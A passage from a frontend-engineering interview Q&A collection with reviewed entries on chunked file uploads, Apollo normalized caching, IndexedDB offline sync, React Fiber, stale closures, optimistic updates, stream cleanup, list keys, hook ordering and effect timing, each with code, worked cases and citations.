    onProgress: (percent: number) => void
): Promise<any> {
    return new Promise((resolve, reject) => {
        const xhr = new XMLHttpRequest();
        const formData = new FormData();
        formData.append('file', file);

        // Track upload progress events:
        xhr.upload.onprogress = (event) => {
            if (event.lengthComputable) {
                const percent = Math.round((event.loaded / event.total) * 100);
                onProgress(percent);
            }
        };

        xhr.onload = () => {
            if (xhr.status >= 200 && xhr.status < 300) {
                resolve(JSON.parse(xhr.responseText));
            } else {
                reject(new Error(`Upload failed: ${xhr.status}`));
            }
        };
        xhr.onerror = () => reject(new Error('Network upload error'));
        xhr.open('POST', url);
        xhr.send(formData);
    });
}
```

**Complexity analysis and mechanics:**
- **Drag-and-Drop:** Handlers must call `e.preventDefault()` on `dragover` to allow drops, and extract files from `e.dataTransfer.files`.
- **Resumability:** Slicing `file.slice()` reads binary chunks from disk as `Blob` without loading the entire multi-gigabyte file into JavaScript RAM.

**Algorithmic mechanics and edge cases:**
Direct uploads to Cloud Storage (AWS S3, Google Cloud Storage) should use pre-signed PUT URLs obtained from the backend, bypassing the application server completely and saving backend bandwidth.

## Why

Progress tracking and chunked slicing allow reliable transmission of multi-gigabyte assets over unstable consumer connections.

## Worked Case

Walkthrough scenario: A user uploads a 500MB video on a 4G connection. At 80%, the connection drops. In a single-file upload, the entire 500MB upload fails and must restart from 0%. With chunked multipart uploading (5MB chunks), the client records that chunks 1 through 80 succeeded. When connection restores, it resumes from chunk 81, saving 400MB of duplicate data transfer.

## Risk

Attempting to read an entire 2GB video file into memory using FileReader.readAsArrayBuffer crashes the browser tab with OOM.

## Trade-off

Requires using legacy XMLHttpRequest or specialized protocols like TUS rather than simple fetch calls.

## Try This

Drag a file over a drop zone and inspect event.dataTransfer.files to read file metadata before uploading.

## Follow-ups

### Why is e.preventDefault() required on the dragover event for HTML5 drag and drop?

By default, browsers reject dropped files or attempt to navigate to the file URL; calling preventDefault() signals that the element is a valid drop target.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/upload
- https://tus.io/protocols/resumable-upload.html

# How does GraphQL normalized client caching (e.g., Apollo Client) differ from document-level REST endpoint caching?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** REST clients typically cache responses at the **document/URL level**: a request to `GET /api/users/12` caches the entire response body under that specific endpoint string. If `GET /api/users` also returns user 12 with updated details, the two cache entries have no relationship, resulting in data desynchronization. In contrast, GraphQL clients (like Apollo Client or Relay) use a **Normalized Cache**: they disassemble incoming query response trees into individual entities identified by a globally unique key (typically `__typename:id`, e.g. `User:12`) and store them in a flat dictionary.

```typescript
// Conceptual representation of Apollo's Normalized Cache:
// Flattened Entity Store:
const normalizedCache = {
    'User:12': { id: '12', __typename: 'User', name: 'Alice', role: 'admin' },
    'User:15': { id: '15', __typename: 'User', name: 'Bob', role: 'member' },
    'Post:101': { id: '101', __typename: 'Post', title: 'Hello', author: { __ref: 'User:12' } },
    'ROOT_QUERY': {
        'currentUser': { __ref: 'User:12' },
        'posts': [{ __ref: 'Post:101' }]
    }
};
```

**Complexity analysis and mechanics:**
- **Automatic propagation:** Updating `User:12`'s name via any mutation automatically updates every component reading `User:12`, regardless of which query fetched it.
- **Normalization overhead:** O(E) where E is the number of entities in the GraphQL response graph, breaking trees into reference pointers.

**Algorithmic mechanics and edge cases:**
Normalization requires every GraphQL query to request `id` and `__typename`. If a query omits the `id` field, Apollo cannot generate a stable cache key, falling back to caching the object embedded under the query, which destroys cross-query synchronization.

## Why

Normalized caching ensures that mutating an entity in one widget instantly synchronizes across all other widgets on the screen.

## Worked Case

Walkthrough scenario: An application has a TopNav displaying the user's name ('Alice') and a ProfileSettings form. The user changes their name to 'Alicia' in ProfileSettings. In REST, TopNav stays 'Alice' until its own endpoint refetches. In normalized GraphQL, the mutation updates entity User:1 in the normalized store. Both TopNav and ProfileSettings reference User:1, so TopNav updates its text to 'Alicia' in 0ms without refetching.

## Risk

Omitting id from GraphQL queries causes Apollo to store unnormalized objects that fail to synchronize across screens.

## Trade-off

Delivers automatic entity synchronization at the expense of higher CPU normalization costs and client bundle size.

## Try This

Inspect Apollo Client Cache in Apollo DevTools and observe nested queries decomposing into ROOT_QUERY references.

## Follow-ups

### What happens in a normalized cache if an entity does not have an id field?

The client cannot normalize the entity into the global flat table; it remains nested inside the parent query result, preventing cross-component synchronization.

## Citations

- https://www.apollographql.com/docs/react/caching/overview/
- https://relay.dev/docs/principles-and-architecture/thinking-in-graphql/

# How do you design an offline-first data layer with IndexedDB synchronization and conflict resolution?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** An offline-first frontend architecture treats local client storage (IndexedDB) as the primary source of truth, with backend networks acting as an asynchronous synchronization peer. The architecture consists of three core components:
1. **Local IndexedDB Store:** All user reads and writes interact with a local IndexedDB database (via lightweight wrappers like `idb` or Dexie.js), providing 0ms local operations regardless of network state.
2. **Outbox Synchronization Queue:** Mutations are appended to an IndexedDB `outbox` table with timestamps and idempotency keys.
3. **Sync Engine & Conflict Resolution:** When online, a sync worker drains the outbox to the server. Conflicts (e.g. concurrent edits on different devices) are resolved via **Last-Write-Wins (LWW)** timestamps or **Conflict-Free Replicated Data Types (CRDTs)**.

```typescript
interface OutboxMutation {
    id: string;          // UUID
    entity: string;      // 'notes'
    action: 'CREATE' | 'UPDATE' | 'DELETE';
    payload: any;
    timestamp: number;
}

export class OfflineSyncEngine {
    async queueMutation(mutation: Omit<OutboxMutation, 'id' | 'timestamp'>) {
        const record: OutboxMutation = {
            ...mutation,
            id: crypto.randomUUID(),
            timestamp: Date.now()
        };
        await db.outbox.add(record);
        this.triggerSync();
    }

    async triggerSync() {
        if (!navigator.onLine) return;
        const pending = await db.outbox.orderBy('timestamp').toArray();
        for (const mutation of pending) {
            try {
                await api.syncMutation(mutation);
                await db.outbox.delete(mutation.id); // Remove on success
            } catch (err) {
                console.warn('Sync paused due to network error:', err);
                break; // Stop draining on network failure
            }
        }
    }
}
```

**Complexity analysis and mechanics:**
- **Storage capacity:** IndexedDB supports gigabytes of data (typically 50-80% of available disk space), unlike `localStorage`'s 5MB limit.
- **Asynchronous I/O:** IndexedDB operations run on a background worker thread, preventing main-thread UI jank.

**Algorithmic mechanics and edge cases:**
Listening to `window.addEventListener('online', () => syncEngine.triggerSync())` triggers immediate queue draining upon network recovery. Server endpoints must be idempotent to tolerate duplicate replay transmissions if a connection drops mid-acknowledgment.

## Why

Offline-first architectures guarantee that users can create, edit, and read data uninterrupted regardless of network connectivity.

## Worked Case

Walkthrough scenario: An inspector on a factory floor fills out equipment inspection forms in a basement with zero cellular signal. The app saves forms to IndexedDB and appends 12 records to db.outbox. The inspector ascends to the surface, and navigator.onLine fires. OfflineSyncEngine drains all 12 items to the server in chronological order, displaying 'All changes saved to cloud'.

## Risk

Naive last-write-wins conflict resolution can silently overwrite data edited concurrently by another collaborator on a different device.

## Trade-off

Delivers offline reliability at the expense of requiring local schema migrations and synchronization conflict logic.

## Try This

Store an entity in IndexedDB, turn on Chrome DevTools Offline mode, mutate the data, restore online mode, and observe queue sync.

## Follow-ups

### Why is localStorage unsuitable for offline-first data stores?

localStorage has a 5MB storage limit, lacks indexing, only stores strings, and executes synchronously on the main thread, blocking animations and user input.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API
- https://developer.mozilla.org/en-US/docs/Web/API/Navigator/onLine

# How does React 19 Fiber reconciliation coordinate concurrent rendering with useTransition and Server Components?

<!-- meta
answer_format: conceptual
domain: frontend
subdomain: frontend
difficulty: advanced design scenario
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**React 19 Fiber reconciliation decouples rendering from synchronous browser paint cycles, enabling interruptible, priority-based concurrent rendering.** In legacy React, rendering was recursive and synchronous: once reconciliation began, the browser main thread was blocked until the entire virtual DOM tree was compared, causing UI jank and dropped animation frames on large trees.\n\n**The Fiber linked-list work unit.** React Fiber re-architects the virtual DOM into a singly-linked list of mutable work units called Fibers (`child`, `sibling`, `return`). Instead of a rigid call stack, React can pause work, yield execution back to the browser via `requestIdleCallback` or microtasks, and resume or abort work based on priority lanes.\n\n**Concurrent rendering with useTransition.** The `useTransition` hook allows developers to mark state updates as non-blocking transitions: `startTransition(() => setSearchQuery(input))`.

React processes the urgent update (typing into the input field) immediately, while deferring the heavy reconciliation (re-rendering 1,000 search result cards) to a low-priority lane. If the user types a new character before the background render finishes, React discards the in-flight background Fiber work and starts fresh with the new input.\n\n**React Server Components (RSC) boundary.** Server Components execute exclusively on the Node/Edge server during request time or build time, emitting a serialized streaming JSON format (RSC payload) rather than HTML. They add zero JavaScript bytes to client bundles, can query databases directly, and seamlessly interleave with interactive Client Components (`'use client'`).

## Why

A user types rapidly into a filterable table with 5,000 rows. Without concurrent transitions, typing freezes for 200ms per keystroke. With `useTransition`, keystrokes remain instantaneous (60 FPS) while table re-rendering proceeds smoothly in the background.

## Worked Case

A user types rapidly into a filterable table with 5,000 rows. Without concurrent transitions, typing freezes for 200ms per keystroke. With useTransition, keystrokes remain instantaneous (60 FPS) while table re-rendering proceeds smoothly in the background.

## Risk

Marking updates that affect user-input controlled components as transitions can cause visual stutter and out-of-sync form inputs.

## Trade-off

Concurrent rendering and Server Components eliminate UI freezes and bundle bloat, at the cost of a steeper mental model regarding client/server module boundaries and asynchronous rendering lifecycles.

## Try This

Implement a heavy list filter in React using standard `useState` vs `useTransition`. Throttle CPU in Chrome DevTools to 6x slowdown and compare keystroke responsiveness.

## Follow-ups

### What is the difference between useDeferredValue and useTransition?

`useTransition` wraps the state updater function to deprioritize the trigger; `useDeferredValue` wraps a value itself to defer re-rendering consumers of that value.

## Citations

- https://react.dev/reference/react/useTransition
- https://github.com/acdlite/react-fiber-architecture

# Why do stale closures occur in React hooks, and how does the useRef mutable reference pattern resolve them?

<!-- meta
answer_format: conceptual
domain: frontend
subdomain: frontend
difficulty: advanced design scenario
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Stale closures occur when a JavaScript function captures variables from an earlier render cycle's lexical scope, retaining obsolete values across subsequent renders.** In React's functional component model, every render execution is a distinct function invocation with its own closed-over props, state, and local variables.\n\n**The capture trap in asynchronous effects and timers.** Consider a timer or WebSocket listener registered inside a hook: `useEffect(() => { const timer = setInterval(() => { console.log(count); setCount(count + 1); }, 1000); return () => clearInterval(timer); }, [])`. Because the dependency array is empty (`[]`), the effect callback executes only once during component mount. The interval callback forms a closure over `count = 0` from the initial render.

Every second, it reads `0` and sets `0 + 1 = 1`. The counter never increments past 1 because it remains permanently bound to the initial lexical scope.\n\n**Resolving stale closures via useRef.** The `useRef` hook returns an immutable container object whose `.current` property is mutable and persists across all render lifecycles without triggering re-renders: `const countRef = useRef(count); countRef.current = count;`. Inside long-running callbacks, event listeners, or WebSockets, reading `countRef.current` always dereferences the live, latest value from the most recent render cycle, completely bypassing closure staleness. Alternatively, functional state updates (`setCount(prev => prev + 1)`) resolve the trap by operating directly on the latest queued state.

## Why

A streaming SSE chat handler accumulates tokens. An unmemoized callback captures the initial `messages = []` array. Every incoming token appends to an empty array, erasing previous tokens instead of building the conversation transcript. `useRef` maintains the live token buffer across chunks.

## Worked Case

A streaming SSE chat handler accumulates tokens. An unmemoized callback captures the initial messages = [] array. Every incoming token appends to an empty array, erasing previous tokens instead of building the conversation transcript. useRef maintains the live token buffer across chunks.

## Risk

Mutating `ref.current` during the component's render phase (outside of effects or event handlers) violates React pure rendering rules and breaks concurrent mode.

## Trade-off

Using `useRef` bypasses the declarative dependency tracking of `useEffect`, solving closure staleness while requiring manual reference synchronization.

## Try This

Build an interval counter in React with an empty dependency array. Observe that it stays stuck at 1. Refactor it using `countRef.current` or `setCount(c => c + 1)` and verify continuous counting.

## Follow-ups

### What is useEffectEvent in modern React?

`useEffectEvent` is an experimental React hook that extracts non-reactive logic out of an Effect, allowing event handlers inside effects to read the latest props/state without listing them in dependencies.

## Citations

- https://react.dev/reference/react/useRef
- https://react.dev/learn/synchronizing-with-effects

# How do optimistic UI updates work in modern React, and how should network rollbacks and error boundaries be coordinated?

<!-- meta
answer_format: conceptual
domain: frontend
subdomain: frontend
difficulty: advanced design scenario
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Optimistic UI updates immediately apply anticipated state changes to the client interface before receiving server network confirmation, maximizing perceived responsiveness.** In traditional request-response interfaces, when a user clicks 'Like' or submits a chat prompt, the UI displays a spinner and waits 300–800ms for network round-trips.

Optimistic design assumes operations succeed 99% of the time, updating the UI in 0ms while sending the network mutation in the background.\n\n**The React 19 useOptimistic hook.** React 19 formalizes optimistic state through `useOptimistic`: `const [optimisticMessages, setOptimisticMessages] = useOptimistic(messages, (state, newMsg) => [...state, { ...newMsg, pending: true }])`. When a mutation is triggered inside an async transition: (1) `setOptimisticMessages` renders the provisional message instantly; (2) The background async server action executes; (3) If the server succeeds, the authoritative parent `messages` state updates, and React automatically replaces the optimistic version; and (4) If the server rejects with an error, React automatically rolls back the optimistic state without manual undo logic.\n\n**Coordinating rollbacks, toasts, and Error Boundaries.** If an optimistic mutation fails: (1) Rollback to snapshot: React discards the optimistic state cleanly; (2) Non-intrusive notification: display an error banner or toast notification ('Message failed to send') with a 'Retry' action button; and (3) Error Boundaries: transient network errors must NOT crash the entire page via Error Boundaries; reserve Error Boundaries strictly for unhandled render-time exceptions, handling network rejections inside local async handlers.

## Why

A user sends a chat message. Under pessimistic UI, the message input disables for 1.2 seconds until the backend acknowledges. Under optimistic UI, the message appears in the chat stream instantly with a faint 'sending' indicator, feeling instantaneous.

## Worked Case

A user sends a chat message. Under pessimistic UI, the message input disables for 1.2 seconds until the backend acknowledges. Under optimistic UI, the message appears in the chat stream instantly with a faint 'sending' indicator, feeling instantaneous.

## Risk

Failing to handle optimistic rollback on financial or irreversible actions (like stock purchases or bank transfers) misleads users into believing an uncommitted transaction occurred.

## Trade-off

Optimistic updates deliver perceived zero-latency interfaces at the cost of managing provisional state flags, retry queues, and rollback notifications.

## Try This

Implement a 'Toggle Favorite' button using React `useOptimistic`. Inject a mock 500 network error after 1 second, and verify that the optimistic heart icon reverts cleanly to its previous state with an error toast.

## Follow-ups

### Can multiple optimistic updates queue up concurrently?

Yes. `useOptimistic` chains multiple provisional updates sequentially, rolling all of them back if the underlying server transaction fails.

## Citations

- https://react.dev/reference/react/useOptimistic
- https://react.dev/reference/react/startTransition

# What causes memory leaks in single-page React applications handling streaming connections, and how do cleanup functions prevent them?

<!-- meta
answer_format: conceptual
domain: frontend
subdomain: frontend
difficulty: advanced design scenario
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Memory leaks in real-time React applications stem from un-cancelled network streams, retained event listeners, and closure references in long-lived single-page application (SPA) sessions.** When users navigate between routes, components mount and unmount continuously. If an SSE `EventSource`, WebSocket, or `ReadableStream` is not cleanly aborted upon component unmount, the network socket remains open in browser memory, and its message callback retains strong references to unmounted component Fibers.\n\n**The retained DOM tree and detached window leak.** Every time the user navigates away from and back to a chat page, an un-closed stream creates an orphaned socket connection. The socket listener retains references to component state setters.

Even though the component has unmounted, the JavaScript V8 garbage collector cannot reclaim the component's Fiber tree because an active network listener holds a reference path to it. Over time, browser memory grows from 50MB to over 2GB, eventually crashing the browser tab with an Out-Of-Memory error.\n\n**The AbortController cleanup contract in useEffect.** Every asynchronous effect opening a streaming connection must return a synchronous cleanup function: `useEffect(() => { const controller = new AbortController(); fetch('/api/chat', { signal: controller.signal }).then(...); return () => controller.abort(); }, [conversationId])`. When the component unmounts or `conversationId` changes, React invokes the returned cleanup function synchronously, immediately terminating the HTTP fetch, closing the TCP socket, and allowing V8 to garbage collect the unmounted Fiber tree.

## Why

A user switches between 20 customer chats. Because the SSE connection lacked an `abort()` cleanup function, 20 zombie sockets remain open in the background, receiving tokens and accumulating 800MB of leaked V8 heap memory until the tab crashes.

## Worked Case

A user switches between 20 customer chats. Because the SSE connection lacked an abort() cleanup function, 20 zombie sockets remain open in the background, receiving tokens and accumulating 800MB of leaked V8 heap memory until the tab crashes.

## Risk

Calling `setState()` on an unmounted component after an un-cancelled network stream completes causes memory leaks and React console warnings.

## Trade-off

Strictly wiring `AbortController` cleanup into every stream listener adds minor hook boilerplate, but guarantees zero socket leaks and flat memory consumption in SPAs.

## Try This

Open Chrome DevTools -> Memory -> Heap Snapshot. Navigate between two routes opening SSE streams without cleanup 10 times. Observe the retained detached Fiber nodes in the snapshot.

## Follow-ups

### Why does React StrictMode run effects twice on mount in development?

React mounts, unmounts, and re-mounts components in development to deliberately surface missing cleanup functions and detect memory leaks before production deployment.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/AbortController
- https://react.dev/learn/synchronizing-with-effects#how-to-handle-effects-fetching-data

# How does React's Fiber architecture enable incremental rendering, pause/resume, and priority-based scheduling?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** React Fiber is a complete reimplementation of React's core reconciliation engine that replaced the legacy synchronous stack reconciler. In the stack reconciler, tree diffing was recursive and uninterruptible; once a render started, it monopolized the JavaScript main thread until completion, dropping animation frames on large component trees. Fiber transforms this recursive stack traversal into a singly-linked list of work units called Fiber nodes (`child`, `sibling`, `return`). This enables cooperative multitasking: React can pause rendering after a time slice (typically 5ms), yield control to the browser event loop to process user input or animations, and resume or abort background work based on priority lanes.

```typescript
// Conceptual representation of a Fiber Node:
interface FiberNode {
    tag: WorkTag;              // FunctionComponent, HostComponent, etc.
    key: null | string;        // Reconciliation key
    elementType: any;          // 'div', Component function, etc.
    stateNode: any;            // Actual DOM node or class instance
    return: FiberNode | null;  // Parent Fiber
    child: FiberNode | null;   // First child Fiber
    sibling: FiberNode | null; // Next sibling Fiber
    memoizedState: any;        // Linked list of hook states
    memoizedProps: any;        // Props from previous render
    pendingProps: any;         // Props passed in current render
    alternate: FiberNode | null;// Double-buffering counterpart (current <-> workInProgress)
    lanes: Lanes;              // Priority bitmask for scheduling
}
```

**Complexity analysis and mechanics:**
- **Time complexity:** Reconciliation remains O(n) across n component nodes, but execution is sliced into non-blocking chunks.
- **Double Buffering:** React maintains two trees: `current` (visible on screen) and `workInProgress` (built in memory during render). Once work is complete, React swaps a single pointer to make `workInProgress` the `current` tree in a single atomic commit.

**Algorithmic mechanics and edge cases:**
The Render Phase is purely computational and can be aborted or restarted if higher-priority work (like user typing) enters the scheduler. The Commit Phase applies DOM mutations and is strictly synchronous and non-interruptible to prevent tearing or half-updated UI states.

## Why

Fiber decouples the component tree traversal from the synchronous call stack, unlocking concurrent interruptible rendering.

## Worked Case

Walkthrough scenario: A user types rapidly into a search input while an expensive 5,000-row table filters in the background. In legacy React, typing lags because table rendering blocks the main thread. In Fiber, keystroke updates are assigned urgent SyncLane, while table filtering is assigned TransitionLane. React pauses the table Fiber traversal every 5ms, yields to paint the input cursor, and resumes table reconciliation without dropping input frames.

## Risk

Side effects placed inside component render functions execute multiple times because the Render Phase can be paused and restarted.

## Trade-off

Significantly higher internal framework complexity and memory usage (two trees) in exchange for smooth 60fps responsiveness.

## Try This

Inspect React DevTools Profiler during a state transition and observe how urgent tasks preempt deferred transitions.

## Follow-ups

### Why is the Commit Phase synchronous while the Render Phase is interruptible?

If the Commit Phase were interruptible, the browser would display partially mutated DOM elements, causing flickering and visual tearing for users.

## Citations

- https://react.dev/learn/reconciliation
- https://github.com/acdlite/react-fiber-architecture

# How does the reconciliation diffing algorithm compare element trees, and why are index keys dangerous?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** React's reconciliation diffing algorithm operates under two heuristic assumptions to achieve O(n) complexity instead of the theoretical O(n^3) minimum for tree editing:
1. Two elements of different types (e.g. `<div>` vs `<span>`, or `ComponentA` vs `ComponentB`) produce completely different subtrees. React unmounts the old subtree, destroying its DOM and internal state, and mounts the new one from scratch.
2. When comparing children in a list, React uses the `key` prop to match elements across renders. Using array indexes as keys causes severe bugs when items are inserted, deleted, or reordered because keys stay tied to positions rather than item identities.

```tsx
// UNSAFE: Using array index as key
{items.map((item, index) => (
    <TodoItem key={index} title={item.title} />
))}

// SAFE: Using stable unique identifier as key
{items.map((item) => (
    <TodoItem key={item.id} title={item.title} />
))}
```

**Complexity analysis and mechanics:**
- **Diffing performance:** O(n) linear scan across child lists comparing `type` and `key`.
- **State association:** Local component state (e.g., internal `<input>` state, open toggles) is bound to the Fiber node position identified by its `key`.

**Algorithmic mechanics and edge cases:**
When prepending an item to a list keyed by index: item 0 gets key 0, item 1 gets key 1, etc. React compares old key 0 with new key 0, assumes the component is the same, retains its old internal state (like an uncontrolled text input value), and merely updates the props. The user sees their input text assigned to the wrong row! Stable unique keys (`item.id`) ensure React moves the existing DOM node.

## Why

Keys provide persistent element identity across renders, allowing React to move DOM nodes rather than recreating them.

## Worked Case

Walkthrough scenario: A task list contains [Task A, Task B] keyed by index. Task A has an uncontrolled checkbox marked checked. The user prepends Task C to the list. With index keys, Task C receives key 0 and inherits the checked state from the old key 0. Task A now has key 1 and takes Task B's unchecked state. Switching to key={task.id} matches Task A with its original Fiber node, moving the checked checkbox to position 1 and rendering Task C as unchecked.

## Risk

Keying list items by array index causes input values and local state to corrupt or attach to wrong items when lists are reordered.

## Trade-off

Unique stable keys require having persistent IDs from data sources but guarantee correct state preservation and optimal DOM moves.

## Try This

Build a list of inputs keyed by index, type text in row 1, click a button that prepends an item, and observe input text mismatch.

## Follow-ups

### Can keys be used to deliberately force a component to reset its local state?

Yes, changing the key prop on a component forces React to unmount the old instance and mount a fresh instance with pristine initial state.

## Citations

- https://react.dev/learn/rendering-lists#why-does-react-need-keys
- https://react.dev/learn/preserving-and-resetting-state

# How do hook calls map to an internal linked list on a Fiber node, and why must hook order be invariant?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** In React, hooks do not rely on magic or global name lookups. Each Fiber node maintains an internal singly-linked list of Hook objects stored in `fiber.memoizedState`. During rendering, React advances an internal pointer (`workInProgressHook`) along this linked list with every hook invocation (`useState`, `useEffect`, `useMemo`). Because hooks have no names, React matches each hook call to its corresponding state cell *strictly by the sequence in which the hook is executed*. 

```typescript
// Internal React Hook representation on a Fiber:
interface Hook {
    memoizedState: any;      // Current state value or effect record
    baseState: any;          // State before queued updates
    baseQueue: Update | null;// Unprocessed updates
    queue: UpdateQueue | null;// Pending update queue
    next: Hook | null;       // Pointer to the next hook in the linked list!
}
```

**Complexity analysis and mechanics:**
- **Lookup time:** O(1) pointer advancement: `workInProgressHook = currentHook.next`.
- **The Rules of Hooks Invariant:** Hooks must only be called at the top level of a component, never inside conditionals, loops, or nested functions.

**Algorithmic mechanics and edge cases:**
If a hook call is wrapped in an `if (condition)`: when `condition` is true on render 1, React creates 3 hook nodes [H1, H2, H3]. When `condition` becomes false on render 2, the conditional hook is skipped. React advances its pointer, reading H2's state for H3, causing state misalignments, corrupted hooks, and runtime crashes like `Rendered fewer hooks than expected`.

## Why

Sequential linked-list indexing enables hooks to be lightweight and stateless without requiring unique identifier strings.

## Worked Case

Walkthrough scenario: A component calls useState('name'), conditionally calls useState('age') if isAdult is true, then calls useEffect. On initial render with isAdult=true: Hook 0 is name, Hook 1 is age, Hook 2 is effect. On second render with isAdult=false, Hook 1 (age) is skipped. React attempts to match useEffect against Hook 1 (which holds age state), causing an immediate hook type mismatch crash.

## Risk

Calling hooks conditionally misaligns the internal linked list pointer, corrupting component state across subsequent renders.

## Trade-off

Requires strict adherence to top-level hook execution rules (enforced by ESLint) in exchange for zero-boilerplate state declarations.

## Try This

Wrap a useState call in an if statement and observe the runtime crash: Error: Rendered fewer hooks than expected.

## Follow-ups

### How does React enforce the Rules of Hooks during development?

Via the eslint-plugin-react-hooks linter rule and runtime assertion checks comparing the count of rendered hooks against the Fiber's previous hook list.

## Citations

- https://react.dev/reference/rules/rules-of-hooks
- https://github.com/facebook/react/blob/main/packages/react-reconciler/src/ReactFiberHooks.js

# Why do stale closures happen in React hooks like useEffect and useCallback, and how do you resolve them?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** In JavaScript, a closure captures variables from its lexical environment at the moment of creation. In React, each render is a snapshot of state with its own isolated props and state constants. When an effect or callback (e.g., in `setInterval` or event listeners) captures state but omits that state from its dependency array `[]`, the closure forever references the frozen values from the initial render—resulting in a stale closure.

```tsx
// STALE CLOSURE BUG:
function StaleCounter() {
    const [count, setCount] = useState(0);
    useEffect(() => {
        const id = setInterval(() => {
            setCount(count + 1); // count is frozen at 0 forever!
        }, 1000);
        return () => clearInterval(id);
    }, []); // count omitted from dependencies
    return <div>{count}</div>; // Displays 1 and stops incrementing!
}

// RESOLUTION 1: Functional State Updates
setCount(prev => prev + 1); // Receives latest authoritative state

// RESOLUTION 2: Mutable Ref Pattern (for callbacks)
const countRef = useRef(count);
countRef.current = count; // Updated synchronously on every render
```

**Complexity analysis and mechanics:**
- **Memory impact:** Closures retain references to their scope; stale closures can prevent garbage collection of large captured objects.
- **Functional updater:** `setCount(prev => prev + 1)` bypasses closure scoping by queuing an update transformer executed against the latest Fiber queue.

**Algorithmic mechanics and edge cases:**
The mutable ref pattern (`useRef`) creates a stable container object `{ current: value }` whose identity never changes across renders. Callbacks can read `ref.current` at any point in time without needing to be re-instantiated, eliminating unnecessary effect re-runs while guaranteeing fresh state access.

## Why

Functional updates and mutable refs provide access to the latest state without triggering constant teardown and re-creation of intervals.

## Worked Case

Walkthrough scenario: An auto-saving draft editor registers an interval: setInterval(() => save(text), 5000) with empty dependencies []. The user types a 500-word essay. When the interval fires, it reads text from the closure captured on mount, which is empty string ''. The editor overwrites the user's remote draft with empty text. Switching to a ref (textRef.current = text) ensures the timer always saves the latest typed contents.

## Risk

Omitting dependencies to stop effect loops causes callbacks to read obsolete state values, producing silent logical bugs.

## Trade-off

Functional updates solve scalar state updates; complex multi-state dependencies require useReducer or useRef synchronization.

## Try This

Run the stale setInterval counter in a browser and observe count incrementing to 1 and freezing because it repeatedly evaluates 0 + 1.

## Follow-ups

### When should you use useReducer instead of useState to avoid stale closure issues?

When the next state depends on multiple disparate state values, dispatching an action to a reducer consolidates state transitions into a single pure function with latest state.

## Citations

- https://react.dev/learn/state-as-a-snapshot
- https://react.dev/learn/synchronizing-with-effects#dependencies-should-match-the-code

# How do useEffect, useLayoutEffect, and useInsertionEffect differ in execution timing and paint blocking?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** These three effect hooks execute at precise, different milestones during React's Commit Phase:
1. **`useInsertionEffect`:** Fires synchronously *before* all DOM mutations. Designed exclusively for CSS-in-JS libraries (like styled-components or Emotion) to inject `<style>` tags before React calculates layout, preventing layout recalculation thrashing.
2. **`useLayoutEffect`:** Fires synchronously *after* DOM mutations, but *before* the browser paints pixels to the screen. It blocks visual paint, making it the correct place to measure DOM dimensions (e.g. `getBoundingClientRect`) and synchronously adjust styles or scroll positions to avoid visual flickering.
3. **`useEffect`:** Fires asynchronously *after* DOM mutations and *after* the browser has painted the screen. It does not block paint, making it optimal for non-visual operations like network requests, logging, and subscriptions.

```tsx
function Tooltip({ targetRect }: { targetRect: DOMRect }) {
    const ref = useRef<HTMLDivElement>(null);
    const [position, setPosition] = useState({ top: 0, left: 0 });

    // useLayoutEffect prevents tooltip from visibly jumping across screen:
    useLayoutEffect(() => {
        if (ref.current) {
            const { height } = ref.current.getBoundingClientRect();
            setPosition({ top: targetRect.top - height, left: targetRect.left });
        }
    }, [targetRect]);

    return <div ref={ref} style={{ position: 'absolute', ...position }}>Tooltip</div>;
}
```

**Complexity analysis and mechanics:**
- **Paint blocking:** `useLayoutEffect` delays browser paint by executing on the main thread before composite; `useEffect` defers via `postMessage`/`MessageChannel`.
- **SSR warning:** `useLayoutEffect` emits a warning when rendered on the server because the server produces HTML without a DOM layout engine.

**Algorithmic mechanics and edge cases:**
Overusing `useLayoutEffect` degrades performance and harms Interaction to Next Paint (INP) because heavy calculations in layout effects directly freeze the main thread before frames can be rendered. Default to `useEffect` unless avoiding a visual flicker is mandatory.

## Why

Selecting the proper effect timing guarantees visual stability for DOM measurements while keeping general side effects non-blocking.

## Worked Case

Walkthrough scenario: A popover menu measures its height to decide whether to flip upwards or downwards. With useEffect, the popover renders downwards, paints on screen, measures, and flips upwards on the next frame—causing a noticeable 1-frame visual flash. Moving the measurement to useLayoutEffect updates the state synchronously before paint, presenting the popover in its final position immediately.

## Risk

Performing heavy computational work or data fetching inside useLayoutEffect locks the main thread and freezes browser painting.

## Trade-off

useLayoutEffect eliminates visual layout shifts at the cost of blocking screen rendering until effect execution finishes.

## Try This

Measure a dynamic DOM element inside useEffect vs useLayoutEffect on a throttled CPU and observe the visual layout jump in useEffect.

## Follow-ups

### Why should ordinary application code almost never use useInsertionEffect?

useInsertionEffect has very limited access to refs and state; it was created specifically for CSS-in-JS library authors to inject style tags prior to browser layout calculation.

## Citations

- https://react.dev/reference/react/useLayoutEffect
- https://react.dev/reference/react/useInsertionEffect

# How does automatic batching in React 18+ combine multiple state updates across timeouts and promises?

<!-- meta
